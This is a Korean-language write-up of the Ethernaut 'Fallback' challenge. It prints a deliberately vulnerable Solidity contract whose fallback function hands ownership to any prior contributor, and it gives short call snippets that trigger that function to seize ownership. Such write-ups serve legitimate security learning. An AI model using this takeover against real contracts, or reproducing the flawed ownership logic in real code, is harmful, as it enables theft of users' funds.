+++
title = "0x01. Fallback"
description = "Ethernaut"
date = 2023-07-12
toc = true

[taxonomies]
categories = ["Ethernaut"]
tags = ["Solidity", "Ethereum"]

[extra]
math=true
+++

# 📄 코드 분석

```solidity
contract Fallback {
    using SafeMath for uint256;
    mapping(address => uint256) public contributions;
    address payable public owner;

    // 컨트랙트를 배포하는 순간, `owner` 는 `1000 eth`를 기여한 것으로 기록됨
    constructor() public {
        owner = payable(msg.sender); // Type issues must be payable address
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    // `0.001` ether 이상을 함께 보내면, `contribution` 에 해당 금액을 더해서 기록해둠
    // 만약 `owner` 보다 더 많은 금액을 기여했다면 새로운 owner 가 됨
    function contribute() public payable {
        require(msg.value < 0.001 ether, "msg.value must be < 0.001"); // Add message with require
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = payable(msg.sender); // Type issues must be payable address
        }
    }

    // `contribution` 을 조회하는 함수
    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    // 컨트랙트에 존재하는 `eth`를 출금하는 함수
    // 오직 `owner`만 호출할 수 있음
    function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
    }

    // `fallback` 함수
    fallback() external payable {
        // naming has switched to fallback
        require(
            msg.value > 0 && contributions[msg.sender] > 0,
            "tx must have value and msg.send must have made a contribution"
        ); // Add message with require
        owner = payable(msg.sender); // Type issues must be payable address
    }
}
```

---

# 💣 취약점
- `Fallback` 함수에서 `owner`를 변경하므로, `fallback`을 호출하기만 하면 문제를 풀 수 있음을 알 수 있습니다.
```solidity
    // `fallback` 함수
    fallback() external payable {
        // naming has switched to fallback
        require(
            msg.value > 0 && contributions[msg.sender] > 0,
            "tx must have value and msg.send must have made a contribution"
        ); // Add message with require

        // owner 변경
        owner = payable(msg.sender); // Type issues must be payable address
    }
```
- [Solidity Docs](https://docs.soliditylang.org/en/v0.8.20/contracts.html#fallback-function)에 따르면, `Fallback`함수는 아래의 경우 호출할 수 있습니다.
> - <txtred>존재하지 않는 function</txtred>을 호출하는 경우
> - <txtylw>*receive*</txtylw> 함수가 없을 때, `eth`를 보내는 트랜잭션을 받은 경우
> - `msg.data`에 값이 존재하는 경우

- 따라서, 아래와 같은 방법으로 `fallback`을 호출할 수 있습니다.

```solidity
// 1. 잘못된 function signature 로 fallback 함수를 호출
bytes memory payload = abi.encodeWithSignature(
    "wrong_signature(uint256)",
    payable(address(ethernautFallback)),
    10 wei
);
payable(address(ethernautFallback)).call{value: 1 wei}(payload);

// 2. `ether` 를 보내는 트랜잭션으로 fallback 함수를 호출
payable(address(ethernautFallback)).call{value: 1 wei}("");
```

---
